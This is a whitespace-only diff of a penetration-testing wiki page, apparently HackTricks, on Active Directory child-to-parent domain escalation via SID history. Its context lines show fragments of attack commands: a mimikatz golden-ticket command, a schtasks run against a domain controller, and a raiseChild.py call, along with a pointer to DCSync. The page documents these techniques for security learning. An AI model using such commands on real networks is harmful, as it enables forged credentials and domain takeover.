@@ -71,12 +71,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 For more info about golden tickets check:
 
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 For more info about diamond tickets check:
+
 
 
 {{#ref}}
@@ -104,6 +106,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 
 With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+
 
 
 {{#ref}}
@@ -160,5 +163,4 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 - [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
 
